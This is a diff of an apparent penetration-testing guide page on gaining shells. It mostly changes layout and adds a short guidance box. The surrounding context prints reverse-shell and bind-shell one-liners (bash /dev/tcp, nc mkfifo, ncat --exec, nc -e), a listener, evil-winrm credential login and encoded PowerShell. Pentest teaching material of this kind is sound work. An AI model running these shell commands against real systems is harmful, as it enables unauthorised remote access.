@@ -36,6 +36,9 @@
 
 <table><thead><tr><th>Evidence</th><th>Choose</th></tr></thead><tbody><tr><td>One bounded command is enough</td><td>Direct execution</td></tr><tr><td>Valid credential + enabled remote service</td><td>SSH/WinRM/RDP</td></tr><tr><td>Target can reach Kali</td><td>Reverse shell</td></tr><tr><td>Kali can reach a target listener</td><td>Bind shell</td></tr><tr><td>Staged/protocol-aware payload</td><td>Matching <code>multi/handler</code></td></tr></tbody></table></details><details data-investigation><summary><h2 id="listener">10.6.3 Start a listener that matches the expected callback <span class="method-label">Listener</span></h2></summary>
 <a id="s-10-11-3"></a><a id="s-10-6-3" data-legacy-anchor="s-10-11-3"></a>
+<blockquote>
+<p><strong>Run/context:</strong> start the listener on the endpoint the target can reach; run the selected connection command in the confirmed execution context. <strong>Decide:</strong> a TCP connection is not yet an interactive command session. Use the <a href="#callback-ladder">callback ladder</a> for a missing or unusable connection, then <a href="#verify-session">verify host and identity</a> inside the new session.</p>
+</blockquote>
 <p>Traditional/OpenBSD-style Netcat:</p>
 <pre><code class="language-bash">rlwrap nc -lvnp LPORT
 </code></pre>
@@ -46,7 +49,7 @@
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">ss -lntp | grep ':LPORT'
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Select <code>LHOST</code> from the target's route. Confirm the listener is not bound only to loopback or the wrong interface/address family.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="linux-reverse-shells">10.6.4 Obtain a Linux shell through a supported reverse connection <span class="method-label">Linux reverse shells</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="linux-reverse-shells">10.6.4 Obtain a Linux shell through a supported reverse connection <span class="method-label">Linux reverse shells</span></h2></summary>
 <a id="s-10-11-4"></a><a id="s-10-6-4" data-legacy-anchor="s-10-11-4"></a>
 <pre><code class="language-bash">bash -c 'bash -i >&#x26; /dev/tcp/LHOST/LPORT 0>&#x26;1'
 </code></pre>
@@ -61,7 +64,7 @@ cat /tmp/f | /bin/sh -i 2>&#x26;1 | nc LHOST LPORT >/tmp/f
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">ncat LHOST LPORT --exec /bin/sh
 </code></pre></div><div class="command-reading"><blockquote>
 <p>If the injection launches <code>/bin/sh</code>, wrap Bash-only syntax in <code>bash -c '...'</code> and encode it for each outer parser.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="windows-command-channels">10.6.5 Obtain a Windows command session through a supported channel <span class="method-label">Windows command channels</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="windows-command-channels">10.6.5 Obtain a Windows command session through a supported channel <span class="method-label">Windows command channels</span></h2></summary>
 <a id="s-10-11-5"></a><a id="s-10-6-5" data-legacy-anchor="s-10-11-5"></a>
 <p>Prefer authenticated access when available:</p>
 <pre><code class="language-bash">evil-winrm -i TARGET -u USER -p 'PASSWORD'
@@ -91,7 +94,7 @@ $client.Close()
 <div class="command-pair"><div class="command-action"><pre><code class="language-cmd">powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
 </code></pre></div><div class="command-reading"><blockquote>
 <p><code>-EncodedCommand</code> requires UTF-16LE. Base64 is representation, not encryption or AV evasion.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="bind-shells">10.6.6 Connect to a shell listening on the reachable target <span class="method-label">Bind shells</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="bind-shells">10.6.6 Connect to a shell listening on the reachable target <span class="method-label">Bind shells</span></h2></summary>
 <a id="s-10-11-6"></a><a id="s-10-6-6" data-legacy-anchor="s-10-11-6"></a>
 <h3 id="variant-10-11-6-1">10.6.6.1 target, only if this nc build supports -e</h3><pre><code class="language-bash"># target, only if this nc build supports -e
 nc -lvnp PORT -e /bin/sh</code></pre>
